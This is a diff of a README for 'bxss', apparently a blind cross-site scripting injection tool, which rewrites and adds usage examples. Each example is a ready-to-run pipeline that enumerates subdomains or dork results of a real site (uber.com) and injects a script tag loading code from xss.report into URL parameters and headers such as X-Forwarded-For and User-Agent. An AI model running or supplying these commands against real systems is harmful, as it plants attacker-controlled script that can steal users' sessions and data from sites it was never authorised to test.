@@ -71,15 +71,57 @@ go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
 
 ## 🔥 Usage Examples
 
-### Injecting Blind XSS Into Parameters
+### Parameters
 ```bash
-subfinder -d uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/username></script>' -parameters
+subfinder -d uber.com \
+| gau \
+| grep "&" \
+| bxss -a -p '><script src=https://xss.report/c/username></script>' \
+-t
 ```
 
-### Injecting Blind XSS Into X-Forwarded-For Header
+### X-Forwarded-For Header
 ```bash
-subfinder -d uber.com | gau | bxss -payload '"><script src=https://xss.report/c/username></script> -header "X-Forwarded-For"
+subfinder -d uber.com \
+| gau \
+| bxss -p '><script src=https://xss.report/c/username></script>' \
+-H "X-Forwarded-For"
 ```
+
+### Custom Headers & Parameters
+```bash
+echo uber.com \
+| haktrails subdomains \
+| httpx \
+| hakrawler -u \
+| bxss -p '><script src=https://xss.report/c/username></script>' \
+-H "User-Agent" \
+-t
+```
+
+### Google Dorks With Dorki
+```bash
+curl -X GET -H "Authorization: Bearer <Token>" \
+-H "X-Secret-Key: <Secret>" \
+https://dorki.attaxa.com/api/search?q=site:example.com -s \
+| jq -r .[][].url \
+| grep "&" \
+| bxss -a -p '><script src=https://xss.report/c/username></script>'
+```
+
+### Custom Headers & Parameters With Rate Limit
+```bash
+echo uber.com \
+| haktrails subdomains \
+| httpx \
+| hakrawler -u \
+| bxss -a -p '><script src=https://xss.report/c/username></script>' \
+-H "User-Agent" \ 
+-t \
+-rl 10
+```
+
+For advanced dorking and vulnerability exploration, check out [Dorki](https://dorki.attaxa.com/) and sign up today!
 
 ---
 
